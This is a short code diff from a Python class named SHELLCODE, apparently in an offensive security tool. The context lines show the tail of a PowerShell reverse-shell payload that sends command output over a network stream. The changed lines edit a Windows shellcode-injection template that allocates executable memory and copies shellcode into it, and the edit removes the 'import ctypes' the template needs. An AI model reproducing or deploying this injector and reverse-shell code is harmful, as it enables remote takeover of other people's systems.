@@ -205,8 +205,7 @@ class SHELLCODE(object):
         "$send = ([text.encoding]::ASCII).GetBytes('='*30 + $output + '='*30);"
         "$stream.Write($send,0,$send.Length);$client.Close();break}}}")
 
-    injectwindows = """import ctypes
-shellcode = bytearray('%s')
+    injectwindows = """shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
 buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
